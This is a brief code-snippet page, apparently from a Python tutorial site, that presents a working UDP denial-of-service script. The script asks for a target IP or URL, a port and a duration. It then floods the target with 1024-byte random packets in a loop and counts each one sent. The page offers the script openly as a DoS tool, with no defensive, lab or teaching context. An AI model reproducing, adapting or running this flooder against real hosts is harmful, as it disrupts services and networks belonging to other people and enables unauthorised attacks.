---
title: python script simple udp dos 3 (snippet)
date: 2020-03-03
tags: ["python"]
---
Python script 'simple udp dos 3'


Modules used in program: 
* `import random`
* `import socket`
* `import time`
* `import sys`
* `import os`

## python simple udp dos 3

Python example: simple udp dos 3

```python
import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
print("This is a simple tool for udp dos.")

ip = input("Target ip or url: ")
port = int(input("Port: "))
dur = int(input("Time: "))

timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("Sent %s packets to %s" % (sent, ip))
    except KeyboardInterrupt:
        sys.exit()

```

## Python links

- Learn Python: https://pythonbasics.org/
- Python Tutorial: https://pythonspot.com
